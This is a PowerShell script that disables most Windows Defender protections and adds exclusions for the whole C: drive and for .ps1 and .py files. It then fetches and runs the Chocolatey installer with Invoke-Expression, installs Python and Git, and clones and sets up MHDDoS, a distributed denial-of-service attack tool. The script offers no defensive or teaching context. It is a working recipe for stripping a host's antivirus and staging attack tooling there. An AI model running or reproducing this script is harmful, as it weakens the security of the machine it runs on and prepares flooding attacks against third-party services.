

Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\*.*"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"
Set-MpPreference -ExclusionExtension "py"
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
Remove-Item C:\ProgramData\chocolatey -Recurse -Force
# Install Choco
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
if (choco list --lo -r -e python3) {
  Write-Host "'python3' is installed"
}else{
choco install -y python3 # Install Python

}

if (choco list --lo -r -e git) {
  Write-Host "'git' is installed"
}else{
choco install -y git # Install GIT

}



$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") # Refresh env variables

$p = ' -p 1200'
$rpc = ' --rpc 1000'
$debug = ' --debug'

###
Set-Location '~'
Remove-Item 'MHDDoS' -Recurse -Force
git clone 'https://github.com/MatrixTM/MHDDoS.git'
Set-Location '~/MHDDoS'
python.exe -m pip install --upgrade pip
python -m pip install -r 'requirements.txt'


